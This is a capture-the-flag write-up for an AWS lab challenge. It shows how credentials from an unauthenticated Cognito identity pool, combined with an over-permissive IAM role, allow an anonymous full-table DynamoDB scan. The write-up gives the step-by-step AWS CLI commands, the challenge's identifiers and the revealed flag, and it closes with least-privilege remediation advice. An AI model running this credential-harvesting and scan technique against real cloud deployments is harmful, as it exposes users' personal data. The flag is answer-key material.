# Day 3 — Complimentary

> Part of the [Hacker Holidays 2026 findings log](../FINDINGS.md).

- **Status:** ✅ Completed
- **URL / target:** `http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/` (static site hosted on an S3 website bucket; AWS account id `332173347248` is visible in the bucket name)
- **Category:** Cloud Security → AWS Cognito (unauthenticated identities) + IAM over-permissioning + DynamoDB
- **Objective:** Track down the AWS mechanism issuing credentials → use them to dump more than your own record from DynamoDB → retrieve the flag from another guest's data.
- **Story hook:** _"No account needed. No login screen. It just... knows things about you the moment you open it."_ + _"ask it for more."_
- **How it works (from `app.js`):** the page has no login because it fetches **unauthenticated guest AWS credentials** from a **Cognito Identity Pool**, then calls `dynamodb.getItem` for the visitor's own `guest_id` only.
  - `IDENTITY_POOL_ID = us-east-1:836c0949-292d-485b-b532-52d5ca7bb688`
  - `TABLE_NAME = complimentary-GuestWellnessProfiles`, `AWS_REGION = us-east-1`
- **Vulnerability:** the IAM role attached to the pool's **unauthenticated identities** grants **table-wide `dynamodb:Scan`** (not scoped to the caller's own key). Any anonymous visitor can therefore read every guest profile, not just their own.
- **Attack path:**
  1. Extracted the Identity Pool ID, table name and region from the in-page `app.js`.
  2. Requested an unauthenticated identity, exchanged it for temporary creds, then ran `dynamodb scan` over the whole table.
  3. Flag was planted in guest **`guest-vip-042`**'s `notes` field.
- **Flag:** <details><summary>click to reveal</summary><code>THM{fr33_app_fr33_d4t4!}</code></details>
- **Lesson:** Unauthenticated Cognito Identity Pool + an IAM role allowing table-wide `Scan` = anonymous full-table read. Guest/unauth roles must be least-privilege and (for DynamoDB) scoped to the caller's own partition key via IAM `dynamodb:LeadingKeys` conditions.

## Walkthrough

1. **Get an unauthenticated identity from the pool** (no signing required):

   ```bash
   aws cognito-identity get-id \
     --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 \
     --region us-east-1 --no-sign-request
   ```

2. **Exchange the IdentityId for temporary AWS credentials:**

   ```bash
   aws cognito-identity get-credentials-for-identity \
     --identity-id "us-east-1:<IDENTITY_ID>" \
     --region us-east-1 --no-sign-request
   ```

3. **Load the returned creds and dump the entire table** (the exploit — `Scan` instead of the app's per-key `GetItem`):

   ```bash
   export AWS_ACCESS_KEY_ID="ASIA..."
   export AWS_SECRET_ACCESS_KEY="..."
   export AWS_SESSION_TOKEN="..."
   aws dynamodb scan --table-name complimentary-GuestWellnessProfiles \
     --region us-east-1 --output json | grep -iE 'thm\{|flag'
   ```

4. The scan returned **5 guest records** (guest-vibe, guest-lambo, guest-vip-042, guest-patch, guest-ponzi), each with `email`, `phone`, `location`, `password` and `notes`. The flag was in **guest-vip-042**:

   > "If you're reading this, the wellness app's guest role can read every profile, not just its own. **THM{...}**"
